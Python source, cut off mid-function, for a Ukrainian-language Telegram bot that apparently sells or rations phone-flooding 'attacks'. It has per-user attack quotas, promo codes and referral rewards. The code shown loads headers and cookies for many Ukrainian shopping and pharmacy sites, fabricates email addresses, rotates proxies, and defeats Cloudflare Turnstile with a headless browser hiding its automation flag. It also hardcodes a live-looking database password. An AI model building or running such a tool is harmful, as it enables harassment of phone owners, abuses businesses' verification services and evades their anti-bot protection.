from aiogram import *
import fake_useragent
import asyncio
import logging
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    logging.warning("Playwright –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ. –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è cf-turnstile-response —Ç–æ–∫–µ–Ω—É –±—É–¥–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–µ.")
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked, UserDeactivated, ChatNotFound
from aiohttp import BasicAuth
from headers_main import (
    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
    cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto,
    headers_smartmedical, cookies_smartmedical
)
import asyncpg
import config
import aiohttp
import random
import string
import re
import uuid
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
import urllib.parse
import itertools
try:
    from zoneinfo import ZoneInfo
except ImportError:
    # –î–ª—è Python < 3.9 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ pytz
    try:
        import pytz
        ZoneInfo = None
    except ImportError:
        ZoneInfo = None
        pytz = None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [810944378]
channel_id = "-1003203193556"

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ—ó –¥–∞—Ç–∏ –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º
def get_kyiv_date():
    """–ü–æ–≤–µ—Ä—Ç–∞—î –ø–æ—Ç–æ—á–Ω—É –¥–∞—Ç—É –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º"""
    if ZoneInfo:
        # Python 3.9+
        kyiv_tz = ZoneInfo("Europe/Kyiv")
        return datetime.now(kyiv_tz).date()
    elif pytz:
        # Python < 3.9 –∑ pytz
        kyiv_tz = pytz.timezone("Europe/Kyiv")
        return datetime.now(kyiv_tz).date()
    else:
        # Fallback - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Å–∏—Å—Ç–µ–º–Ω–∏–π —á–∞—Å (–Ω–µ —ñ–¥–µ–∞–ª—å–Ω–æ, –∞–ª–µ –∫—Ä–∞—â–µ –Ω—ñ—á–æ–≥–æ)
        return datetime.now().date()

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ datetime –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º
def get_kyiv_datetime():
    """–ü–æ–≤–µ—Ä—Ç–∞—î –ø–æ—Ç–æ—á–Ω–∏–π datetime –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º (offset-naive –¥–ª—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö)"""
    if ZoneInfo:
        # Python 3.9+
        kyiv_tz = ZoneInfo("Europe/Kyiv")
        kyiv_now = datetime.now(kyiv_tz)
        # –ö–æ–Ω–≤–µ—Ä—Ç—É—î–º–æ –≤ UTC —ñ –ø—Ä–∏–±–∏—Ä–∞—î–º–æ —á–∞—Å–æ–≤–∏–π –ø–æ—è—Å –¥–ª—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö
        return kyiv_now.astimezone(ZoneInfo("UTC")).replace(tzinfo=None)
    elif pytz:
        # Python < 3.9 –∑ pytz
        kyiv_tz = pytz.timezone("Europe/Kyiv")
        utc_tz = pytz.UTC
        kyiv_now = datetime.now(kyiv_tz)
        # –ö–æ–Ω–≤–µ—Ä—Ç—É—î–º–æ –≤ UTC —ñ –ø—Ä–∏–±–∏—Ä–∞—î–º–æ —á–∞—Å–æ–≤–∏–π –ø–æ—è—Å –¥–ª—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö
        utc_now = kyiv_now.astimezone(utc_tz)
        return utc_now.replace(tzinfo=None)
    else:
        # Fallback - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Å–∏—Å—Ç–µ–º–Ω–∏–π —á–∞—Å
        return datetime.now()

message = ("–ü—Ä–∏–≤—ñ—Ç.\n–í–∞—à –≤–∏–±—ñ—Ä: üëá")

db_config = {
    'user': 'postgres',
    'password': 'kXcfoihheRhCgwJUzBCJxNpdSTZIRvmL',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}

# –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –ø—É–ª –∑'—î–¥–Ω–∞–Ω—å –∑–∞–º—ñ—Å—Ç—å –æ–¥–Ω–æ–≥–æ –∑'—î–¥–Ω–∞–Ω–Ω—è
db_pool = None

attack_flags = {}
# –ü—Ä–∞–ø–æ—Ä—Ü—ñ –¥–ª—è –∞–∫—Ç–∏–≤–Ω–∏—Ö –∞—Ç–∞–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (—â–æ–± –Ω–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –æ–¥–Ω–æ—á–∞—Å–Ω—ñ –∞—Ç–∞–∫–∏)
# –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ chat_id —è–∫ –∫–ª—é—á (–≤ private —á–∞—Ç–∞—Ö chat_id == user_id)
active_attacks = {}  # chat_id -> True/False
# –ü—Ä–∞–ø–æ—Ä—Ü—ñ –¥–ª—è —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ–≤
giveaway_flags = {}

proxies_all = []
proxies_healthy = []
proxies_last_check = None
proxies_stats = []  # list of {entry, latency_ms}
proxies_usage = {}  # key -> count
proxies_usage_total = 0

last_status_msg = {}  # chat_id -> message_id

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(**db_config, min_size=5, max_size=20)
    
    # –û—Ç—Ä–∏–º—É—î–º–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –±–æ—Ç–∞ –¥–ª—è –æ–±—Ä–æ–±–∫–∏ –∑–≥–∞–¥–æ–∫
    try:
        bot._me = await bot.get_me()
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –±–æ—Ç–∞: {e}")
    
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                name TEXT,
                username TEXT,
                block INTEGER DEFAULT 0,
                attacks_left INTEGER DEFAULT 6,
                promo_attacks INTEGER DEFAULT 0,
                referral_attacks INTEGER DEFAULT 0,
                unused_referral_attacks INTEGER DEFAULT 0,
                last_attack_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                referrer_id BIGINT,
                referral_count INTEGER DEFAULT 0,
                referral_notification_sent BOOLEAN DEFAULT FALSE
            );
            CREATE TABLE IF NOT EXISTS blacklist (
                phone_number TEXT PRIMARY KEY
            );
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT,
                referred_id BIGINT,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(referred_id)
            );
            CREATE TABLE IF NOT EXISTS user_messages (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS promocodes (
                id SERIAL PRIMARY KEY,
                code TEXT UNIQUE NOT NULL,
                attacks_count INTEGER NOT NULL,
                valid_until TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            CREATE TABLE IF NOT EXISTS promo_activations (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                promo_code TEXT,
                activated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                attacks_added INTEGER,
                UNIQUE(user_id, promo_code)
            );
        ''')
        
        # –î–æ–¥–∞—î–º–æ –Ω–æ–≤—ñ –∫–æ–ª–æ–Ω–∫–∏ —è–∫—â–æ —ó—Ö –Ω–µ–º–∞—î
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS promo_attacks INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding promo_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding referral_count column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referrer_id BIGINT')
        except Exception as e:
            logging.error(f"Error adding referrer_id column: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_notification_sent BOOLEAN DEFAULT FALSE')
        except Exception as e:
            logging.error(f"Error adding referral_notification_sent column: {e}")
            
        try:
            await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
        except Exception as e:
            logging.error(f"Error changing last_attack_date column type: {e}")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()
    create_promo = State()
    create_promo_attacks = State()
    create_promo_hours = State()
    delete_promo = State()
    enter_promo = State()
    add_to_blacklist = State()

async def email():
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_turnstile_token(proxy_url=None, proxy_auth=None):
    """
    –û—Ç—Ä–∏–º—É—î —Ç–æ–∫–µ–Ω Cloudflare Turnstile —á–µ—Ä–µ–∑ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–π –±—Ä–∞—É–∑–µ—Ä Playwright
    """
    if not PLAYWRIGHT_AVAILABLE:
        logging.warning("Playwright –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Å—Ç–∞—Ç–∏—á–Ω–∏–π —Ç–æ–∫–µ–Ω.")
        return None
    
    try:
        async with async_playwright() as p:
            # –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –±—Ä–∞—É–∑–µ—Ä–∞
            browser_options = {
                "headless": True,
                "args": ["--disable-blink-features=AutomationControlled"]
            }
            
            # –î–æ–¥–∞—î–º–æ –ø—Ä–æ–∫—Å—ñ —è–∫—â–æ —î
            if proxy_url:
                # –ö–æ–Ω–≤–µ—Ä—Ç—É—î–º–æ –ø—Ä–æ–∫—Å—ñ —Ñ–æ—Ä–º–∞—Ç –¥–ª—è Playwright
                # –§–æ—Ä–º–∞—Ç: http://user:pass@host:port
                proxy_config = {"server": proxy_url}
                browser_options["proxy"] = proxy_config
            
            browser = await p.chromium.launch(**browser_options)
            
            # –°—Ç–≤–æ—Ä—é—î–º–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∑ cookies
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            
            page = await context.new_page()
            
            # –ß–µ–∫–∞—î–º–æ –ø–æ–∫–∏ Turnstile –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è —Ç–∞ –æ—Ç—Ä–∏–º–∞—î —Ç–æ–∫–µ–Ω
            try:
                # –®—É–∫–∞—î–º–æ –µ–ª–µ–º–µ–Ω—Ç Turnstile
                await page.wait_for_selector('iframe[src*="challenges.cloudflare.com"]', timeout=10000)
                logging.info("–ó–Ω–∞–π–¥–µ–Ω–æ iframe Cloudflare Turnstile")
                
                # –ß–µ–∫–∞—î–º–æ –ø–æ–∫–∏ —Ç–æ–∫–µ–Ω –∑'—è–≤–∏—Ç—å—Å—è (Turnstile –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É)
                await page.wait_for_timeout(5000)  # –ß–µ–∫–∞—î–º–æ 5 —Å–µ–∫—É–Ω–¥ –Ω–∞ –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏
                
                # –û—Ç—Ä–∏–º—É—î–º–æ —Ç–æ–∫–µ–Ω –∑ JavaScript
                token = await page.evaluate("""
                    () => {
                        // –®—É–∫–∞—î–º–æ –≤—Å—ñ iframe –∑ Turnstile
                        const iframes = document.querySelectorAll('iframe[src*="challenges.cloudflare.com"]');
                        for (let iframe of iframes) {
                            try {
                                // –ù–∞–º–∞–≥–∞—î–º–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∑ callback
                                const token = iframe.contentWindow?.turnstile?.getResponse();
                                if (token) return token;
                            } catch (e) {}
                        }
                        
                        // –ê–±–æ —à—É–∫–∞—î–º–æ –≤ —Ñ–æ—Ä–º—ñ
                        const form = document.querySelector('form');
                        if (form) {
                            const input = form.querySelector('input[name="cf-turnstile-response"]');
                            if (input && input.value) return input.value;
                        }
                        
                        // –ê–±–æ —à—É–∫–∞—î–º–æ –≤ –≥–ª–æ–±–∞–ª—å–Ω—ñ–π –∑–º—ñ–Ω–Ω—ñ–π
                        if (window.turnstileResponse) return window.turnstileResponse;
                        
                        return null;
                    }
                """)
                
                if token:
                    logging.info(f"–û—Ç—Ä–∏–º–∞–Ω–æ Turnstile —Ç–æ–∫–µ–Ω: {token[:50]}...")
                    await browser.close()
                    return token
                else:
                    logging.warning("–¢–æ–∫–µ–Ω Turnstile –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ")
                    
                    # –°–ø—Ä–æ–±—É—î–º–æ –∫–ª—ñ–∫–Ω—É—Ç–∏ –Ω–∞ —Ñ–æ—Ä–º—É —â–æ–± –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ Turnstile
                    try:
                        form = await page.query_selector('form')
                        if form:
                            await form.evaluate("form => form.dispatchEvent(new Event('submit'))")
                            await page.wait_for_timeout(3000)
                            
                            # –ó–Ω–æ–≤—É —à—É–∫–∞—î–º–æ —Ç–æ–∫–µ–Ω
                            token = await page.evaluate("""
                                () => {
                                    const input = document.querySelector('input[name="cf-turnstile-response"]');
                                    return input ? input.value : null;
                                }
                            """)
                            
                            if token:
                                logging.info(f"–û—Ç—Ä–∏–º–∞–Ω–æ Turnstile —Ç–æ–∫–µ–Ω –ø—ñ—Å–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó: {token[:50]}...")
                                await browser.close()
                                return token
                    except Exception as e:
                        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó Turnstile: {e}")
                    
            except Exception as e:
                logging.error(f"–ü–æ–º–∏–ª–∫–∞ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è Turnstile: {e}")
            
            await browser.close()
            return None
            
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è Turnstile —Ç–æ–∫–µ–Ω—É —á–µ—Ä–µ–∑ Playwright: {e}")
        return None

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-—Ç–æ–∫–µ–Ω –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("üõë –ó—É–ø–∏–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É", callback_data="cancel_attack"))
    return keyboard

async def check_subscription_status(user_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in {"member", "administrator", "creator"}:
            return True
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞: {e}")
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if m.chat.type == 'private':
        await m.answer("–°–ø–æ–∫—ñ–π–Ω–æ, –Ω–µ –ø–æ—Å–ø—ñ—à–∞–π! üê¢")

# –û–Ω–æ–≤–ª—é—î–º–æ –∫–ª–∞–≤—ñ–∞—Ç—É—Ä–∏
profile_button = types.KeyboardButton('üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É')
referal_button = types.KeyboardButton('üÜò –î–æ–ø–æ–º–æ–≥–∞')
referral_program_button = types.KeyboardButton('üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞')
check_attacks_button = types.KeyboardButton('‚ùì –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∞—Ç–∞–∫–∏')
promo_button = types.KeyboardButton('üéÅ –£ –º–µ–Ω–µ —î –ø—Ä–æ–º–æ–∫–æ–¥')
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button).add(promo_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º")
admin_keyboard.add("–î–æ–¥–∞—Ç–∏ –Ω–æ–º–µ—Ä –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É")
admin_keyboard.add("–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞")
admin_keyboard.add("–ó–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
admin_keyboard.add("–†–æ–∑–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
admin_keyboard.add("–†–µ—Ñ–µ—Ä–∞–ª–∏")
admin_keyboard.add("–°—Ç–≤–æ—Ä–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
admin_keyboard.add("–í–∏–¥–∞–ª–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
admin_keyboard.add("–°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥—ñ–≤")
admin_keyboard.add("–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–∫—Å—ñ")
admin_keyboard.add("–ù–∞–∑–∞–¥")

def load_proxies_from_file(path: str = "proxy.txt"):
    result = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) != 4:
                    continue
                host, port, user, password = parts
                result.append({"host": host, "port": port, "user": user, "password": password})
    except Exception as e:
        logging.error(f"Proxy load error: {e}")
    return result

def build_proxy_params(entry):
    try:
        # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ http:// –¥–ª—è –ø—Ä–æ–∫—Å—ñ (aiohttp –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î HTTPS —á–µ—Ä–µ–∑ CONNECT)
        url = f"http://{entry['host']}:{entry['port']}"
        auth = BasicAuth(entry["user"], entry["password"]) if entry.get("user") and entry.get("password") else None
        return url, auth
    except Exception:
        return None, None

def proxy_key(entry):
    return f"{entry['host']}:{entry['port']}:{entry.get('user','')}"

async def check_single_proxy(entry):
    proxy_url, proxy_auth = build_proxy_params(entry)
    if not proxy_url:
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        started = asyncio.get_event_loop().time()
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, proxy_auth=proxy_auth) as resp:
                if resp.status == 200:
                    latency = (asyncio.get_event_loop().time() - started) * 1000.0
                    return {"entry": entry, "latency_ms": latency}
    except Exception:
        return None
    return None

async def check_and_update_proxies():
    global proxies_all, proxies_healthy, proxies_last_check, proxies_stats
    proxies_all = load_proxies_from_file()
    if not proxies_all:
        proxies_healthy = []
        proxies_stats = []
        proxies_last_check = datetime.now()
        return {"total": 0, "healthy": 0}
    sem = asyncio.Semaphore(50)
    async def worker(e):
        async with sem:
            return await check_single_proxy(e)
    tasks = [worker(e) for e in proxies_all]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    healthy = [r for r in results if r]
    proxies_healthy = [r["entry"] for r in healthy]
    proxies_stats = healthy
    proxies_last_check = datetime.now()
    return {"total": len(proxies_all), "healthy": len(proxies_healthy)}

def proxy_status_text():
    total = len(proxies_all)
    healthy = len(proxies_healthy)
    when = proxies_last_check.strftime("%d.%m.%Y %H:%M:%S") if proxies_last_check else "‚Äî"
    return f"–ü—Ä–æ–∫—Å—ñ ‚Äî –≤—Å—å–æ–≥–æ: {total}\n–†–æ–±–æ—á–∏—Ö: {healthy}\n–û—Å—Ç–∞–Ω–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞: {when}"

def generate_promo_code():
    """–ì–µ–Ω–µ—Ä—É—î –ø—Ä–æ–º–æ–∫–æ–¥ –∑ –∑–∞–≥–æ–ª–æ–≤–Ω–∏—Ö –ª—ñ—Ç–µ—Ä —Ç–∞ —Ü–∏—Ñ—Ä –¥–æ–≤–∂–∏–Ω–æ—é 10-20 —Å–∏–º–≤–æ–ª—ñ–≤"""
    length = random.randint(10, 20)
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choices(characters, k=length))

async def add_user(user_id: int, name: str, username: str, referrer_id: int = None):
    today = get_kyiv_date()
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
            user_id, name, username, 0, 30, 0, 0, 0, today, referrer_id
        )
        
        if referrer_id:
            # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Ñ—É–Ω–∫—Ü—ñ—é process_referral –¥–ª—è –æ–±—Ä–æ–±–∫–∏ —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤
            await process_referral(referrer_id, user_id, username, name)
        
        profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
        for admin_id in ADMIN:
            try:
                await bot.send_message(admin_id, f"–ù–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—Å—è —É –±–æ—Ç—ñ:\n–Ü–º'—è: {profile_link}", parse_mode='HTML')
            except Exception as e:
                logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—ñ –∞–¥–º—ñ–Ω—É {admin_id}: {e}")

async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("–í–∏ –Ω–µ –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –∫–æ–º–∞–Ω–¥–∞ –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –∫–æ–º–∞–Ω–¥—É /start –≤ –≥—Ä—É–ø–∞—Ö
    
    user_id = message.from_user.id
    args = message.get_args()
    referrer_id = None
    if args and args.isdigit():
        referrer_id = int(args)
        if referrer_id == user_id:
            referrer_id = None
        else:
            async with db_pool.acquire() as conn:
                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                if not referrer_exists:
                    referrer_id = None
    
    if not await check_subscription_status(user_id):
        # –ó–±–µ—Ä—ñ–≥–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è /start –∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ—ó –æ–±—Ä–æ–±–∫–∏ –ø—ñ—Å–ª—è –ø—ñ–¥–ø–∏—Å–∫–∏
        async with db_pool.acquire() as conn:
            await conn.execute(
                'INSERT INTO user_messages (user_id, message_text) VALUES ($1, $2)',
                user_id, message.text
            )
        logging.info(f"–ó–±–µ—Ä–µ–∂–µ–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è: user_id={user_id}, referrer_id={referrer_id}")
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—ñ–¥–ø–∏—Å–∞—Ç–∏—Å—è –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
    
    if message.from_user.id in ADMIN:
        await message.answer('–í–≤–µ–¥—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            # –ù–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á ‚Äî –¥–æ–¥–∞—î–º–æ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏–º id, —è–∫—â–æ —î
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username, referrer_id)
        
        if result and result['block'] == 1:
            await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
            return
        
        welcome_text = f"üéâ –í—ñ—Ç–∞—é, {message.from_user.first_name}!\n\n"
        welcome_text = '–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –±–æ—Ç–∞ –≤–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–æ–≥–æ–¥–∂—É—î—Ç–µ—Å—å –∑ <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">—É–º–æ–≤–∞–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è</a>\n\n'

        
        await bot.send_message(user_id, welcome_text, reply_markup=profile_keyboard, parse_mode='HTML')

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        async with db_pool.acquire() as conn:
            user_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', user_id)
            
            if not user_exists:
                referrer_id = None
                try:
                    last_start_message = await conn.fetchval(
                        'SELECT message_text FROM user_messages WHERE user_id = $1 AND message_text LIKE \'/start%\' ORDER BY timestamp DESC LIMIT 1',
                        user_id
                    )
                    
                    logging.info(f"–û—Å—Ç–∞–Ω–Ω—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è /start: {last_start_message}")
                    
                    if last_start_message and ' ' in last_start_message:
                        args = last_start_message.split(' ')[1]
                        if args.isdigit():
                            referrer_id = int(args)
                            if referrer_id == user_id:
                                referrer_id = None
                            else:
